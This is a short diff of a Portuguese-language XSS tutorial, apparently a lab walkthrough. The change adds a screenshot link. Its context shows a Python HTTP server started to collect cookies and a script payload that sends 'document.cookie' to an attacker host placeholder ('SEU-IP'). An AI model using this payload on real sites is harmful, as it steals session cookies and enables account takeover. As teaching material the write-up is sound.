@@ -70,6 +70,7 @@ primeiro iremos criar um server pra receber o cookie de sessão
 
 ```sudo python3 -m http.server 80```
 
+![image](images/xss-6s.png)
 
 agora rodamos o código no input e submetemos
 ```<script>new Image().src='http://SEU-IP/?='+document.cookie</script>```
